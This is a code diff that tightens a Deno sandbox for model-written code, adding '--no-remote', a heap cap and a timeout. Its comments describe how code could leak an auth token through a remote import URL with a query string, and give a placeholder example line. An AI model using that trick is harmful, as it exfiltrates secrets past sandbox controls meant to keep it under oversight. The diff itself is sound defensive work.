@@ -55,6 +55,11 @@ export function buildDenoPermissionFlags(opts: { apiHost: string; distDir: strin
     // third-party secret in the parent process's environment stays
     // invisible to model-written code even if it tries `Deno.env.toObject()`.
     `--allow-env=KLARIDIAN_BASE_URL,KLARIDIAN_AUTH_TOKEN`,
+    // --allow-net does not govern module imports: Deno allows remote imports
+    // from a default host list (deno.land, jsr.io, esm.sh, cdn.jsdelivr.net,
+    // ...) regardless. That is an egress channel outside the API host (a
+    // query string on an import URL), so remote imports are disabled.
+    `--no-remote`,
     // Deliberately no --allow-write, no --allow-run, no --allow-ffi, no
     // --allow-sys: model-written code has no legitimate need for any of
     // them, and omitting them is the actual sandboxing (Deno denies by
@@ -85,6 +90,10 @@ import path from "node:path";
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 
+// Per-run limits, overridable by env (same names as the Python target).
+const TIMEOUT_MS = Number(process.env.KLARIDIAN_SANDBOX_TIMEOUT ?? "30") * 1000;
+const MAX_HEAP_MB = Number(process.env.KLARIDIAN_SANDBOX_MAX_HEAP_MB ?? "256");
+
 export interface SandboxResult {
   ok: boolean;
   stdout: string;
@@ -108,6 +117,13 @@ export async function runInSandbox(code: string, apiHost: string): Promise<Sandb
       \`--allow-net=\${apiHost}\`,
       \`--allow-read=\${__dirname}\`,
       "--allow-env=KLARIDIAN_BASE_URL,KLARIDIAN_AUTH_TOKEN",
+      // No remote module imports. Deno's default import allow-list (deno.land,
+      // jsr.io, esm.sh, cdn.jsdelivr.net, ...) is NOT covered by --allow-net,
+      // so without this, model code could \\\`await import("https://<cdn>/?x=<token>")\\\`
+      // and leak data outside the API host. Only local modules may load.
+      "--no-remote",
+      // Per-run heap cap so one script can't exhaust the server's memory.
+      \`--v8-flags=--max-old-space-size=\${MAX_HEAP_MB}\`,
       "-", // read the program from stdin
     ];
     const child = spawn("deno", args, {
@@ -127,13 +143,24 @@ export async function runInSandbox(code: string, apiHost: string): Promise<Sandb
 
     let stdout = "";
     let stderr = "";
+    let timedOut = false;
     child.stdout.on("data", (c: Buffer) => { stdout += c.toString("utf-8"); });
     child.stderr.on("data", (c: Buffer) => { stderr += c.toString("utf-8"); });
     child.on("error", (err) => {
       // Deno binary not found, or failed to spawn at all.
       resolve({ ok: false, stdout, stderr: stderr + \`\\\\nSandbox spawn error: \${err.message}\` });
     });
+    // Wall-clock limit: a hung script (e.g. an infinite loop) is killed.
+    const timer = setTimeout(() => {
+      timedOut = true;
+      child.kill("SIGKILL");
+    }, TIMEOUT_MS);
     child.on("close", (exitCode) => {
+      clearTimeout(timer);
+      if (timedOut) {
+        resolve({ ok: false, stdout, stderr: stderr + \`Execution timed out after \${TIMEOUT_MS / 1000}s.\` });
+        return;
+      }
       resolve({ ok: exitCode === 0, stdout, stderr });
     });
 
